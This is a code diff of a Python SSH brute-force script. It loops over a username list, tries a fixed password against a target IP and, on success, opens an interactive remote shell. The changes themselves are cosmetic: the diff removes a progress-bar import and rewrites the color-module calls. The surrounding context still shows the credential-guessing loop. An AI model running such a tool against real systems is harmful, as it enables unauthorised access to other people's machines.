@@ -4,11 +4,7 @@ from pexpect import pxssh
 import argparse
 import time
 
-from p_bar import *
-
 from ssh_connect import *
-
-import color
 
 def main():
 	parser = argparse.ArgumentParser()
@@ -27,9 +23,7 @@ def main():
 				for line in lines: # reading a line from lines in file
 					user = line.strip("\r\n")
 
-					print(color.color_obj.WHITE+"[*] Testing: ", str(user)+":"+args.passwd+color.color_obj.ENDC)
-					
-					#p_bar() #Progressbar
+					print(color_obj.WHITE+"[*] Testing: ", str(user)+":"+args.passwd+color_obj.ENDC)
 
 					conn = connect(args.ip, user, args.passwd) # ssh connect
 
@@ -38,10 +32,10 @@ def main():
 						totalTime = time.time() - startTime
 						totalTime = '%.3f'%totalTime
 
-						print(color.color_obj.PURPLE+f"\n[+] Process Completed\n[+] Time Taken : {totalTime}s\n"+color.color_obj.ENDC)
+						print(color_obj.PURPLE+f"\n[+] Process Completed\n[+] Time Taken : {totalTime}s\n"+color_obj.ENDC)
 
-						print(color.color_obj.GREEN+'''[+] SSH connected!!, Type: exit to quit: 
-						'''+color.color_obj.ENDC)
+						print(color_obj.GREEN+'''[+] SSH connected!!, Type: exit to quit: 
+						'''+color_obj.ENDC)
 
 						command = input(user+'@'+args.ip+':$ ')
 						while command != 'exit':
@@ -51,9 +45,9 @@ def main():
 							command = input(user+'@'+args.ip+':$ ')
 							
 						else:
-							print(color.color_obj.YEL+'''
+							print(color_obj.YEL+'''
 Bye!
-							'''+color.color_obj.ENDC)
+							'''+color_obj.ENDC)
 						exit(0)
 
 	else:
